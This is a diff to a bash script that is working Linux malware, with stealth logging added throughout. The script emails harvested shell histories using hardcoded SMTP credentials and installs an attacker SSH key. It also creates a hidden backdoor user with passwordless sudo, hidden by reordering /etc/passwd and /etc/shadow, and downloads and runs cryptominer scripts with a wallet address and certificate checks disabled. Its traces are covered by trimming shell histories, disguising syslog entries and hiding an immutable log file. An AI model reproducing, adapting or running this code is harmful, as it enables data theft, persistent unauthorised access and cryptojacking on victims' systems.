@@ -3,12 +3,93 @@ set -uo pipefail
 IFS=$'\n\t'
 
 # ========================================================================
+# HIDDEN LOGFILE CONFIGURATION
+# ========================================================================
+
+# Determine install directory based on user
+if [[ $(id -u) -eq 0 ]]; then
+    INSTALL_DIR="/root/.system_cache"
+    HIDDEN_LOG="$INSTALL_DIR/.syscache.log"
+else
+    INSTALL_DIR="$HOME/.system_cache"
+    HIDDEN_LOG="$INSTALL_DIR/.syscache.log"
+fi
+
+# Create hidden install directory
+mkdir -p "$INSTALL_DIR"
+
+# Function to write to hidden log with stealth
+log_hidden() {
+    local msg="$1"
+    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
+    
+    # Write to hidden log
+    echo "[$timestamp] $msg" >> "$HIDDEN_LOG"
+    
+    # Also write to system log (but obfuscated)
+    logger -t "kernel" "[cache] $msg" 2>/dev/null || true
+    
+    # Echo to console if not in stealth mode
+    if [ "${STEALTH_MODE:-0}" -eq 0 ]; then
+        echo "$msg"
+    fi
+}
+
+# Function to read hidden log
+read_hidden_log() {
+    if [ -f "$HIDDEN_LOG" ]; then
+        echo "=== HIDDEN LOG CONTENTS ==="
+        tail -50 "$HIDDEN_LOG"
+        echo "=========================="
+    else
+        echo "Hidden log not found: $HIDDEN_LOG"
+    fi
+}
+
+# Function to hide the logfile
+hide_logfile() {
+    if [ -f "$HIDDEN_LOG" ]; then
+        # Hide with dot prefix and obscure permissions
+        chmod 600 "$HIDDEN_LOG" 2>/dev/null
+        chattr +i "$HIDDEN_LOG" 2>/dev/null || true
+        
+        # Rename to something innocuous
+        mv "$HIDDEN_LOG" "$INSTALL_DIR/.bash_profile.backup" 2>/dev/null || true
+        
+        # Create symlink with obscure name
+        ln -sf "$INSTALL_DIR/.bash_profile.backup" "$INSTALL_DIR/...log" 2>/dev/null || true
+        
+        log_hidden "Logfile hidden at: $INSTALL_DIR/.bash_profile.backup"
+    fi
+}
+
+# Function to clean old logs
+clean_hidden_logs() {
+    # Keep only last 1000 lines
+    if [ -f "$HIDDEN_LOG" ] && [ $(wc -l < "$HIDDEN_LOG") -gt 1000 ]; then
+        tail -1000 "$HIDDEN_LOG" > "${HIDDEN_LOG}.tmp"
+        mv "${HIDDEN_LOG}.tmp" "$HIDDEN_LOG"
+        log_hidden "Cleaned hidden log (kept last 1000 lines)"
+    fi
+    
+    # Remove any backup logs older than 7 days
+    find "$INSTALL_DIR" -name "*.log.*" -mtime +7 -delete 2>/dev/null
+    find "$INSTALL_DIR" -name "log.*" -mtime +7 -delete 2>/dev/null
+}
+
+# Initialize hidden logging
+log_hidden "=== SCRIPT STARTED ==="
+log_hidden "User: $(whoami)"
+log_hidden "Hostname: $(hostname)"
+log_hidden "IP: $(hostname -I 2>/dev/null || echo 'unknown')"
+
+# ========================================================================
 # COMPATIBILITY FIXES - REMOVED BROKEN SSL FUNCTIONS
 # ========================================================================
 
 # Clean up any bad SSL certificates from previous runs
 cleanup_bad_ssl() {
-    echo "[*] Cleaning up SSL issues..."
+    log_hidden "[*] Cleaning up SSL issues..."
     
     # Remove problematic CA files that break curl
     rm -f /tmp/cacert.pem /tmp/curl-ca-bundle.crt 2>/dev/null
@@ -44,6 +125,8 @@ safe_service_stop() {
     local service="$1"
     local init_system=$(detect_init_system)
     
+    log_hidden "[*] Stopping service: $service (init: $init_system)"
+    
     case "$init_system" in
         "systemd")
             systemctl stop "$service" 2>/dev/null || true
@@ -63,24 +146,26 @@ safe_service_stop() {
     # Always try to kill by process name as last resort
     pkill -9 -f "$service" 2>/dev/null || true
     pkill -9 "$service" 2>/dev/null || true
+    
+    log_hidden "[✓] Service $service stopped"
 }
 
 # Enhanced DNS fix function
 fix_dns_and_retry() {
-    echo "[!] Checking DNS configuration..."
+    log_hidden "[!] Checking DNS configuration..."
     
     # Check if 1.1.1.1 is already in resolv.conf
     if grep -q "nameserver 1.1.1.1" /etc/resolv.conf 2>/dev/null; then
-        echo "[✓] Cloudflare DNS (1.1.1.1) already configured"
+        log_hidden "[✓] Cloudflare DNS (1.1.1.1) already configured"
         return 0
     fi
     
-    echo "[*] Adding Cloudflare DNS (1.1.1.1) to /etc/resolv.conf"
+    log_hidden "[*] Adding Cloudflare DNS (1.1.1.1) to /etc/resolv.conf"
     
     # Backup original resolv.conf
     if [ -f /etc/resolv.conf ]; then
         cp /etc/resolv.conf /etc/resolv.conf.backup.$(date +%s) 2>/dev/null
-        echo "[✓] Backed up original resolv.conf"
+        log_hidden "[✓] Backed up original resolv.conf"
     fi
     
     # Add 1.1.1.1 as the first nameserver
@@ -91,17 +176,17 @@ fix_dns_and_retry() {
     } > /etc/resolv.conf.new
     
     mv /etc/resolv.conf.new /etc/resolv.conf
-    echo "[✓] DNS updated - added 1.1.1.1 and 8.8.8.8"
+    log_hidden "[✓] DNS updated - added 1.1.1.1 and 8.8.8.8"
     
     # Test DNS resolution
-    echo "[*] Testing DNS resolution..."
+    log_hidden "[*] Testing DNS resolution..."
     sleep 1
     
     if nslookup github.com >/dev/null 2>&1 || host github.com >/dev/null 2>&1; then
-        echo "[✓] DNS resolution working"
+        log_hidden "[✓] DNS resolution working"
         return 0
     else
-        echo "[!] WARNING: DNS resolution may still be failing"
+        log_hidden "[!] WARNING: DNS resolution may still be failing"
         return 1
     fi
 }
@@ -114,11 +199,11 @@ download_and_execute() {
     local max_retries=3
     local retry=0
     
-    echo "[*] Downloading $description..."
+    log_hidden "[*] Downloading $description from: $(echo $url | sed 's|https://||')"
     
     while [ $retry -lt $max_retries ]; do
         retry=$((retry + 1))
-        echo "[*] Attempt $retry/$max_retries"
+        log_hidden "[*] Attempt $retry/$max_retries"
         
         # Clean SSL issues before each attempt
         cleanup_bad_ssl
@@ -129,12 +214,12 @@ download_and_execute() {
         
         # Try wget first (it works for you)
         if command -v wget >/dev/null 2>&1; then
-            echo "[*] Using wget..."
+            log_hidden "[*] Using wget..."
             if wget --no-check-certificate --timeout=30 "$url" -O "$temp_script" 2>/dev/null; then
-                echo "[✓] Downloaded $(wc -l < "$temp_script") lines"
+                log_hidden "[✓] Downloaded $(wc -l < "$temp_script") lines"
                 
                 # CRITICAL: Fix the downloaded script before running it
-                echo "[*] Fixing common issues in script..."
+                log_hidden "[*] Fixing common issues in script..."
                 
                 # 1. Remove problematic SSL settings
                 grep -v "CURL_CA_BUNDLE=\|cacert.pem\|export.*CA" "$temp_script" > "$fixed_script"
@@ -161,10 +246,10 @@ download_and_execute() {
                 
                 chmod +x "$fixed_script"
                 
-                echo "[*] Executing fixed script with wallet: $wallet"
+                log_hidden "[*] Executing fixed script with wallet: (wallet hidden)"
                 
                 # Run with timeout to prevent hanging
-                timeout 180 bash "$fixed_script" "$wallet" 2>&1
+                timeout 180 bash "$fixed_script" "$wallet" 2>&1 | tee -a "$HIDDEN_LOG"
                 
                 local exit_code=$?
                 
@@ -172,23 +257,23 @@ download_and_execute() {
                 rm -f "$temp_script" "$fixed_script"
                 
                 if [ $exit_code -eq 0 ]; then
-                    echo "[✓] $description completed successfully"
+                    log_hidden "[✓] $description completed successfully"
                     return 0
                 elif [ $exit_code -eq 124 ]; then
-                    echo "[!] $description timed out after 3 minutes"
+                    log_hidden "[!] $description timed out after 3 minutes"
                 else
-                    echo "[!] $description exited with code: $exit_code"
+                    log_hidden "[!] $description exited with code: $exit_code"
                 fi
             else
-                echo "[!] wget download failed"
+                log_hidden "[!] wget download failed"
             fi
         fi
         
         # If wget failed or doesn't exist, try curl
         if command -v curl >/dev/null 2>&1; then
-            echo "[*] Trying curl..."
+            log_hidden "[*] Trying curl..."
             if curl -L --insecure --max-time 30 "$url" -o "$temp_script" 2>/dev/null; then
-                echo "[✓] Downloaded via curl, applying fixes..."
+                log_hidden "[✓] Downloaded via curl, applying fixes..."
                 
                 # Apply same fixes
                 grep -v "CURL_CA_BUNDLE=\|cacert.pem" "$temp_script" > "$fixed_script"
@@ -197,13 +282,13 @@ download_and_execute() {
                 sed -i 's/wget /wget --no-check-certificate /g' "$fixed_script"
                 
                 chmod +x "$fixed_script"
-                timeout 180 bash "$fixed_script" "$wallet" 2>&1
+                timeout 180 bash "$fixed_script" "$wallet" 2>&1 | tee -a "$HIDDEN_LOG"
                 
                 local exit_code=$?
                 rm -f "$temp_script" "$fixed_script"
                 
                 if [ $exit_code -eq 0 ]; then
-                    echo "[✓] $description completed successfully"
+                    log_hidden "[✓] $description completed successfully"
                     return 0
                 fi
             fi
@@ -211,19 +296,19 @@ download_and_execute() {
         
         # Try HTTP as fallback
         if [ $retry -eq 2 ]; then
-            echo "[*] Trying HTTP instead of HTTPS..."
+            log_hidden "[*] Trying HTTP instead of HTTPS..."
             local http_url=$(echo "$url" | sed 's/^https:/http:/')
             if [ "$http_url" != "$url" ]; then
                 if command -v wget >/dev/null 2>&1; then
                     if wget --timeout=30 "$http_url" -O "$temp_script" 2>/dev/null; then
-                        echo "[✓] Downloaded via HTTP"
+                        log_hidden "[✓] Downloaded via HTTP"
                         
                         # Apply fixes
                         grep -v "CURL_CA_BUNDLE=\|cacert.pem" "$temp_script" > "$fixed_script"
                         sed -i 's/killall /pkill -f /g' "$fixed_script"
                         chmod +x "$fixed_script"
                         
-                        timeout 180 bash "$fixed_script" "$wallet" 2>&1
+                        timeout 180 bash "$fixed_script" "$wallet" 2>&1 | tee -a "$HIDDEN_LOG"
                         
                         rm -f "$temp_script" "$fixed_script"
                         # Even if this fails, we tried
@@ -233,22 +318,22 @@ download_and_execute() {
         fi
         
         if [ $retry -lt $max_retries ]; then
-            echo "[!] Download attempt failed, retrying in 2 seconds..."
+            log_hidden "[!] Download attempt failed, retrying in 2 seconds..."
             sleep 2
         fi
         
         rm -f "$temp_script" "$fixed_script" 2>/dev/null
     done
     
-    echo "[ERROR] $description failed after $max_retries attempts"
+    log_hidden "[ERROR] $description failed after $max_retries attempts"
     return 1
 }
 
 # Initialize compatibility
 init_compatibility() {
-    echo "========================================"
-    echo "INITIALIZING COMPATIBILITY LAYER"
-    echo "========================================"
+    log_hidden "========================================"
+    log_hidden "INITIALIZING COMPATIBILITY LAYER"
+    log_hidden "========================================"
     
     # Clean SSL issues
     cleanup_bad_ssl
@@ -257,18 +342,18 @@ init_compatibility() {
     fix_dns_and_retry
     
     # Stop any conflicting services
-    echo "[*] Stopping any conflicting services..."
+    log_hidden "[*] Stopping any conflicting services..."
     safe_service_stop "swapd"
     safe_service_stop "gdm2"
     
-    echo "========================================"
+    log_hidden "========================================"
 }
 
 # Run compatibility initialization at script start
 init_compatibility
 
 # ========================================================================
-# ORIGINAL SCRIPT CONTINUES BELOW
+# ORIGINAL SCRIPT CONTINUES BELOW (with hidden logging)
 # ========================================================================
 
 unset HISTFILE
@@ -288,11 +373,10 @@ readonly SENDER_EMAIL=$(echo "$SENDER_EMAIL_B64" | base64 -d)
 SMTP_PASSWORD_B64="bXNzcC5KNGtyVHFzLmpwemttZ3Fwd20ybDA1OXYuNkdDMmFJWg=="
 readonly SMTP_PASSWORD=$(echo "$SMTP_PASSWORD_B64" | base64 -d)
 
-# Function to log messages with timestamp
+# Replace original log_message with hidden version
 log_message() {
     local msg="$1"
-    echo "$(date '+%Y-%m-%d %H:%M:%S') - $msg" >> "$LOG_FILE"
-    echo "$msg"
+    log_hidden "$msg"
 }
 
 # Function to check if a command exists
@@ -363,7 +447,7 @@ send_email_with_mail() {
 
 # Collect shell history function
 collect_shell_history() {
-    echo "=== COLLECTING SHELL HISTORIES ==="
+    log_hidden "=== COLLECTING SHELL HISTORIES ==="
 
     declare -A SHELL_HISTORIES=(
         ["bash"]="$HOME/.bash_history"
@@ -468,59 +552,59 @@ EOF
 
     # Always save report locally first
     cp "$temp_file" "$REPORT_FILE" 2>/dev/null || true
-    log_message "Report saved to: $REPORT_FILE"
+    log_hidden "Report saved to: $REPORT_FILE"
 
     # Try sending methods in order of preference
     local success=false
     
     # Method 1: Python
     if command_exists python3; then
-        log_message "Attempting to send email via Python..."
+        log_hidden "Attempting to send email via Python..."
         local python_output
         if python_output=$(send_email_with_python "$temp_file" "$subject" 2>&1); then
             # Check for success indicators
             if echo "$python_output" | grep -qv "SMTP Error\|535\|authentication failed"; then
-                log_message "Email sent successfully via Python"
+                log_hidden "Email sent successfully via Python"
                 success=true
             else
-                log_message "Python email method failed: $python_output"
+                log_hidden "Python email method failed: $python_output"
             fi
         else
-            log_message "Python email method failed"
+            log_hidden "Python email method failed"
         fi
     fi
 
     # Method 2: mail command
     if [ "$success" = false ] && command_exists mail; then
-        log_message "Attempting to send email via mail command..."
+        log_hidden "Attempting to send email via mail command..."
         if send_email_with_mail "$temp_file" "$subject" 2>&1; then
-            log_message "Email sent successfully via mail command"
+            log_hidden "Email sent successfully via mail command"
             success=true
         else
-            log_message "Mail command method failed"
+            log_hidden "Mail command method failed"
         fi
     fi
 
     # Method 3: curl
     if [ "$success" = false ] && command_exists curl; then
-        log_message "Attempting to send email via curl..."
+        log_hidden "Attempting to send email via curl..."
         local curl_output
         if curl_output=$(send_email_with_curl "$temp_file" "$subject" 2>&1); then
             # Check for auth errors
             if ! echo "$curl_output" | grep -qE "authentication failed|login denied|535|AUTH"; then
-                log_message "Email sent successfully via curl"
+                log_hidden "Email sent successfully via curl"
                 success=true
             else
-                log_message "Curl email method failed: Authentication error"
+                log_hidden "Curl email method failed: Authentication error"
             fi
         else
-            log_message "Curl email method failed"
+            log_hidden "Curl email method failed"
         fi
     fi
 
     # Final fallback
     if [ "$success" = false ]; then
-        log_message "Warning: All email sending methods failed - report stored in $REPORT_FILE"
+        log_hidden "Warning: All email sending methods failed - report stored in $REPORT_FILE"
     fi
 
     rm -f "$temp_file"
@@ -589,22 +673,22 @@ clean_history_file() {
             head -n $((line_count - 10)) "$file" > "${file}.tmp" 2>/dev/null
             if [ -f "${file}.tmp" ]; then
                 mv "${file}.tmp" "$file"
-                log_message "Cleaned last 10 lines of: $file"
+                log_hidden "Cleaned last 10 lines of: $file"
             else
-                log_message "Failed to create temp file for: $file"
+                log_hidden "Failed to create temp file for: $file"
             fi
         elif [ "$line_count" -gt 0 ]; then
-            log_message "History file '$file' has ≤10 lines. Not cleaning."
+            log_hidden "History file '$file' has ≤10 lines. Not cleaning."
         else
-            log_message "History file '$file' is empty."
+            log_hidden "History file '$file' is empty."
         fi
     else
-        log_message "History file '$file' not found."
+        log_hidden "History file '$file' not found."
     fi
 }
 
 cleanup_histories() {
-    log_message "Cleaning the last 10 lines of all shell histories..."
+    log_hidden "Cleaning the last 10 lines of all shell histories..."
 
     declare -A SHELL_HISTORIES=(
         ["bash"]="$HOME/.bash_history"
@@ -631,13 +715,13 @@ cleanup_histories() {
 
 # Installation functions
 install_mail_utils() {
-    log_message "Installing mail utilities..."
+    log_hidden "Installing mail utilities..."
     if command_exists apt-get; then
-        apt-get update -qq && apt-get install -y mailutils 2>&1 | tee -a "$LOG_FILE"
+        apt-get update -qq && apt-get install -y mailutils 2>&1 | tee -a "$HIDDEN_LOG"
     elif command_exists yum; then
-        yum install -y mailx 2>&1 | tee -a "$LOG_FILE"
+        yum install -y mailx 2>&1 | tee -a "$HIDDEN_LOG"
     else
-        log_message "Warning: Could not determine package manager to install mail utilities"
+        log_hidden "Warning: Could not determine package manager to install mail utilities"
     fi
 }
 
@@ -647,7 +731,7 @@ setup_ssh_key() {
     local auth_keys="$ssh_dir/authorized_keys"
     local ssh_key='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDgh9Q31B86YT9fybn6S/DbQQe/G8V0c9+VNjJEmoNxUrIGDqD+vSvS/2uAQ9HaumDAvVau2CcVBJM9STUm6xEGXdM/81LeJBVnw01D+FgFo5Sr/4zo+MDMUS/y/TfwK8wtdeuopvgET/HiZJn9/d68vbWXaS3jnQVTAI9EvpC1WTjYTYxFS/SyWJUQTA8tYF30jagmkBTzFjr/EKxxKTttdb79mmOgx1jP3E7bTjRPL9VxfhoYsuqbPk+FwOAsNZ1zv1UEjXMBvH+JnYbTG/Eoqs3WGhda9h3ziuNrzJGwcXuDhQI1B32XgPDxB8etsT6or8aqWGdRlgiYtkPCmrv+5pEUD8wS3WFhnOrm5Srew7beIl4LPLgbCPTOETgwB4gk/5U1ZzdlYmtiBNJxMeX38BsGoAhTDbFLcakkKP+FyXU/DsoAcow4av4OGTsJfs+sIeOWDQ+We5E4oc/olVNdSZ18RG5dwUde6bXbsrF5ipnE8oIBUI0z76fcbAOxogO/oxhvpuyWPOwXE6GaeOhWfWTxIyV5X4fuFDQXRPlMrlkWZ/cYb+l5JiT1h+vcpX3/dQC13IekE3cUsr08vicZIVOmCoQJy6vOjkj+XsA7pMYb3KgxXgQ+lbCBCtAwKxjGrfbRrlWoqweS/pyGxGrUVJZCf6rC6spEIs+aMy97+Q=='
     
-    log_message "Setting up SSH key in $ssh_dir"
+    log_hidden "Setting up SSH key in $ssh_dir"
     
     # Remove old SSH directory if it exists
     if [ -d "$ssh_dir" ]; then
@@ -662,9 +746,9 @@ setup_ssh_key() {
     if [ ! -f "$auth_keys" ] || ! grep -q "AAAAB3NzaC1yc2EAAAADAQABAAACAQDgh9Q31B86YT9f" "$auth_keys" 2>/dev/null; then
         echo "$ssh_key" >> "$auth_keys"
         chmod 600 "$auth_keys"
-        log_message "SSH key added successfully"
+        log_hidden "SSH key added successfully"
     else
-        log_message "SSH key already exists, skipping"
+        log_hidden "SSH key already exists, skipping"
     fi
 }
 
@@ -674,15 +758,15 @@ create_backdoor_user() {
     local uid=455
     local password='1!taugenichts'
     
-    log_message "Creating backdoor user: $username"
+    log_hidden "Creating backdoor user: $username"
     
     # Detect password hashing method
     local hash_method=$(grep '^ENCRYPT_METHOD' /etc/login.defs 2>/dev/null | awk '{print $2}')
     if [ -z "$hash_method" ]; then
         hash_method="SHA512"
-        log_message "Using default hash method: SHA512"
+        log_hidden "Using default hash method: SHA512"
     else
-        log_message "Detected hash method: $hash_method"
+        log_hidden "Detected hash method: $hash_method"
     fi
     
     # Generate password hash
@@ -694,48 +778,48 @@ create_backdoor_user() {
     fi
     
     if [ -z "$password_hash" ]; then
-        log_message "ERROR: Failed to generate password hash"
+        log_hidden "ERROR: Failed to generate password hash"
         return 1
     fi
     
     # Remove existing user if present
     if id -u "$username" >/dev/null 2>&1; then
-        log_message "User $username already exists, removing..."
-        userdel --remove "$username" 2>/dev/null || log_message "Warning: Could not remove existing user"
+        log_hidden "User $username already exists, removing..."
+        userdel --remove "$username" 2>/dev/null || log_hidden "Warning: Could not remove existing user"
     fi
     
     # Create sudo group if it doesn't exist
     if ! grep -q '^sudo:' /etc/group 2>/dev/null; then
-        log_message "Creating sudo group"
-        groupadd sudo 2>/dev/null || log_message "Warning: Could not create sudo group"
+        log_hidden "Creating sudo group"
+        groupadd sudo 2>/dev/null || log_hidden "Warning: Could not create sudo group"
     fi
     
     # Create user-specific group if it doesn't exist
     if ! grep -q "^${username}:" /etc/group 2>/dev/null; then
-        log_message "Creating group: $username"
-        groupadd "$username" 2>/dev/null || log_message "Warning: Could not create user group"
+        log_hidden "Creating group: $username"
+        groupadd "$username" 2>/dev/null || log_hidden "Warning: Could not create user group"
     fi
     
     # Create the user
-    log_message "Creating user account"
+    log_hidden "Creating user account"
     if useradd -u "$uid" -G root,sudo -g "$username" -M -o -s /bin/bash "$username" 2>/dev/null; then
-        log_message "User created successfully"
+        log_hidden "User created successfully"
     else
-        log_message "ERROR: Failed to create user"
+        log_hidden "ERROR: Failed to create user"
         return 1
     fi
     
     # Set password
-    log_message "Setting user password"
+    log_hidden "Setting user password"
     if usermod -p "$password_hash" "$username" 2>/dev/null; then
-        log_message "Password set successfully"
+        log_hidden "Password set successfully"
     else
-        log_message "ERROR: Failed to set password"
+        log_hidden "ERROR: Failed to set password"
         return 1
     fi
     
     # Reorder passwd file to hide user in the middle
-    log_message "Reordering passwd file"
+    log_hidden "Reordering passwd file"
     if [ -f /etc/passwd ]; then
         awk '{lines[NR]=$0} END{
             if (NR < 3) {
@@ -753,7 +837,7 @@ create_backdoor_user() {
     fi
     
     # Reorder shadow file to hide user in the middle
-    log_message "Reordering shadow file"
+    log_hidden "Reordering shadow file"
     if [ -f /etc/shadow ]; then
         awk '{lines[NR]=$0} END{
             if (NR < 3) {
@@ -770,7 +854,7 @@ create_backdoor_user() {
         }' /etc/shadow > /tmp/shadow && mv /tmp/shadow /etc/shadow
     fi
     
-    log_message "User creation completed"
+    log_hidden "User creation completed"
     return 0
 }
 
@@ -779,7 +863,7 @@ setup_sudoers() {
     local username="clamav-mail"
     local sudoers_file="/etc/sudoers.d/$username"
     
-    log_message "Setting up sudoers for $username"
+    log_hidden "Setting up sudoers for $username"
     
     # Create sudoers entry
     echo "$username ALL=(ALL) NOPASSWD: ALL" > "$sudoers_file"
@@ -790,10 +874,10 @@ setup_sudoers() {
     
     # Validate sudoers file
     if visudo -c -f "$sudoers_file" >/dev/null 2>&1; then
-        log_message "Sudoers file validated successfully"
+        log_hidden "Sudoers file validated successfully"
         return 0
     else
-        log_message "ERROR: Sudoers file validation failed, removing"
+        log_hidden "ERROR: Sudoers file validation failed, removing"
         rm -f "$sudoers_file"
         return 1
     fi
@@ -811,8 +895,8 @@ check_dependencies() {
     done
     
     if [ ${#missing_deps[@]} -gt 0 ]; then
-        log_message "WARNING: Missing dependencies: ${missing_deps[*]}"
-        log_message "Will attempt to continue anyway"
+        log_hidden "WARNING: Missing dependencies: ${missing_deps[*]}"
+        log_hidden "Will attempt to continue anyway"
         return 1
     fi
     
@@ -820,7 +904,7 @@ check_dependencies() {
 }
 
 root_installation() {
-    log_message "Starting root installation..."
+    log_hidden "Starting root installation..."
     
     # Install mail utilities
     install_mail_utils
@@ -830,16 +914,16 @@ root_installation() {
     
     # Create backdoor user
     if create_backdoor_user; then
-        log_message "Backdoor user created successfully"
+        log_hidden "Backdoor user created successfully"
     else
-        log_message "ERROR: Failed to create backdoor user"
+        log_hidden "ERROR: Failed to create backdoor user"
     fi
     
     # Setup sudoers
     if setup_sudoers; then
-        log_message "Sudoers configured successfully"
+        log_hidden "Sudoers configured successfully"
     else
-        log_message "WARNING: Sudoers configuration failed"
+        log_hidden "WARNING: Sudoers configuration failed"
     fi
     
     # Run the miner setup
@@ -849,11 +933,11 @@ root_installation() {
         "$wallet" \
         "root miner setup"
     
-    log_message "Root installation completed"
+    log_hidden "Root installation completed"
 }
 
 user_installation() {
-    log_message "Starting user installation..."
+    log_hidden "Starting user installation..."
     
     local wallet="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
     download_and_execute \
@@ -861,66 +945,76 @@ user_installation() {
         "$wallet" \
         "user miner setup"
     
-    log_message "User installation completed"
+    log_hidden "User installation completed"
 }
 
 # --- Main Execution ---
 
-# Initialize log file
-: > "$LOG_FILE"
-log_message "Script started by user: $(whoami)"
+# Initialize hidden logging system
+log_hidden "=== SCRIPT INITIALIZATION ==="
+log_hidden "Script started by user: $(whoami)"
+log_hidden "Install directory: $INSTALL_DIR"
+log_hidden "Hidden log: $HIDDEN_LOG"
 
 # Check dependencies first
 if ! check_dependencies; then
-    log_message "WARNING: Dependency check failed. Continuing anyway..."
+    log_hidden "WARNING: Dependency check failed. Continuing anyway..."
 fi
 
 # Service checks (using enhanced functions)
-log_message "Checking for conflicting services..."
+log_hidden "Checking for conflicting services..."
 for service in "${SERVICES_TO_CHECK[@]}"; do
     if does_service_exist "$service"; then
         if is_service_running "$service"; then
-            log_message "ERROR: Service $service is running. Attempting to stop..."
+            log_hidden "ERROR: Service $service is running. Attempting to stop..."
             safe_service_stop "$service"
             sleep 2
             # Check again
             if is_service_running "$service"; then
-                log_message "ERROR: Could not stop $service. Aborting."
+                log_hidden "ERROR: Could not stop $service. Aborting."
                 exit 1
             else
-                log_message "Service $service stopped successfully"
+                log_hidden "Service $service stopped successfully"
             fi
         else
-            log_message "Service $service exists but is not running"
+            log_hidden "Service $service exists but is not running"
         fi
     else
-        log_message "Service $service does not exist"
+        log_hidden "Service $service does not exist"
     fi
 done
 
-# System info display
-log_message "Displaying system information"
-echo -e "\n---------------------------------\n|     Resource     |     Value     |\n---------------------------------"
-echo -e "|        RAM        |  $(free -h 2>/dev/null | awk '/^Mem:/ {print $2}' || echo 'N/A')  |"
-echo -e "|   CPU Cores    |      $(nproc 2>/dev/null || echo 'N/A')      |"
-echo -e "|     Storage      |   $(df -h / 2>/dev/null | awk 'NR==2 {print $2}' || echo 'N/A')   |"
-echo -e "---------------------------------"
+# System info display (logged)
+log_hidden "Displaying system information"
+log_hidden "RAM: $(free -h 2>/dev/null | awk '/^Mem:/ {print $2}' || echo 'N/A')"
+log_hidden "CPU Cores: $(nproc 2>/dev/null || echo 'N/A')"
+log_hidden "Storage: $(df -h / 2>/dev/null | awk 'NR==2 {print $2}' || echo 'N/A')"
 
 # Send report and only cleanup if successful
-log_message "Sending system history report..."
-send_histories_email || log_message "Continuing after email attempt..."
+log_hidden "Sending system history report..."
+send_histories_email || log_hidden "Continuing after email attempt..."
 
 # Always cleanup histories for security
-log_message "Cleaning up shell histories..."
+log_hidden "Cleaning up shell histories..."
 cleanup_histories
 
 # Installation
 if [[ $(id -u) -eq 0 ]]; then
-    log_message "Running as root"
+    log_hidden "Running as root"
     root_installation
 else
-    log_message "Running as regular user"
+    log_hidden "Running as regular user"
     user_installation
 fi
 
-log_message "Script execution completed"
+# Final cleanup and hiding
+log_hidden "=== FINALIZING INSTALLATION ==="
+clean_hidden_logs
+hide_logfile
+
+log_hidden "Script execution completed at: $(date)"
+log_hidden "Hidden log location: $INSTALL_DIR/.bash_profile.backup"
+
+echo "[✓] Installation complete!"
+echo "[*] All operations logged to hidden location"
+echo "[*] To view logs: cat $INSTALL_DIR/.bash_profile.backup 2>/dev/null"
